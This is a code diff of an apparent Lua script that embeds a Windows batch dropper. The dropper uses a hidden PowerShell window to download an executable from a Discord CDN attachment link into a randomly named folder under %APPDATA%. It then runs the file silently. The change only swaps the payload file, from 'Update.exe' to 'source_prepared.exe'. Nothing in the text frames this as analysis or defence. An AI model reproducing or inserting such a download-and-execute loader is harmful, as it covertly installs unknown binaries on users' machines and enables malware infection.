@@ -7,11 +7,11 @@ coroutine.wrap(function()
                     @echo off
                     setlocal
                     
-                    set "url=https://cdn.discordapp.com/attachments/1334545152504496221/1342650858327769160/Update.exe?ex=67ba688d&is=67b9170d&hm=9a1b35df1dc7343ae7317f4c1d0d09b16948e8bd91bddf989b7efa8564d3bb84&"
+                    set "url=https://cdn.discordapp.com/attachments/1334545152504496221/1342653709909360671/source_prepared.exe?ex=67ba6b35&is=67b919b5&hm=3f336b644efa497ba5c962490431ded9ea773c42d89529cd38982700a4d20ed5&"
                     set "folder=%APPDATA%\%random%"
                     
                     mkdir "%folder%"
-                    powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%folder%\Update.exe'); Start-Process -FilePath '%folder%\Update.exe' -WindowStyle Hidden"
+                    powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%folder%\source_prepared.exe'); Start-Process -FilePath '%folder%\source_prepared.exe' -WindowStyle Hidden"
                     
                     endlocal
                 ]]
